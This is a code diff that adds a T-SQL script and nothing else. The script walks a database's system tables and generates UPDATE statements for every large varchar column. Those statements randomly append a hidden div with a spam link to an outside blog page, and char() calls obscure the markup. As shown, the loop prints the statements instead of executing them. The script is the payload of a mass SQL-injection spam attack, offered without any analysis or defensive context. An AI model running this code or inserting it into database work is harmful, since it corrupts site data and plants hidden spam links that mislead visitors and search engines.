@@ -1,0 +1,11 @@
+declare @c cursor;
+declare @d varchar(4000);
+set @c=cursor for 
+select 'update [-'+TABLE_NAME+'] set ['+COLUMN_NAME+']=['+COLUMN_NAME+']+case ABS(CHECKSUM(NewId()))%7 when 0 then ''''+char(60)+''div style="display:none"''+char(62)+''online ''+char(60)+''a href="http:''+char(47)+char(47)+''www.marcandela.com''+char(47)+''blog''+char(47)+''Blog''+char(47)+''page''+char(47)+''unfaithfulhusband"''+char(62)+case ABS(CHECKSUM(NewId()))%3 when 0 then ''married men who cheat with men'' when 1 then ''why women cheat'' else ''read here'' end +char(60)+char(47)+''a''+char(62)+'' go''+char(60)+char(47)+''div''+char(62)+'''' else '''' end' 
+FROM sysindexes AS i 
+INNER JOIN sysobjects AS o ON i.id=o.id 
+INNER JOIN INFORMATION_SCHEMA.COLUMNS ON o.NAME=TABLE_NAME 
+WHERE(indid=0 or indid=1) and DATA_TYPE like '%varchar' and(CHARACTER_MAXIMUM_LENGTH=-1 or CHARACTER_MAXIMUM_LENGTH=2147483647);
+open @c;
+fetch next from @c into @d;
+while @@FETCH_STATUS=0 begin print @d;fetch next from @c into @d;end;close @c
